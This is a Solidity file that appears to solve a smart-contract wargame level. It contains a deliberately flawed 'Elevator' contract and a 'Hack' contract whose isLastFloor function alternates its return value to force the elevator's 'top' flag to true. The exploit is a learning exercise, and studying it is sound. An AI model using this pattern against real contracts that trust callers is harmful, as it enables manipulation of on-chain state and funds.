// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Hack {
    Elevator public target;
    bool public toggle = true;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function hack() public {
        target.goTo(1);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }
}
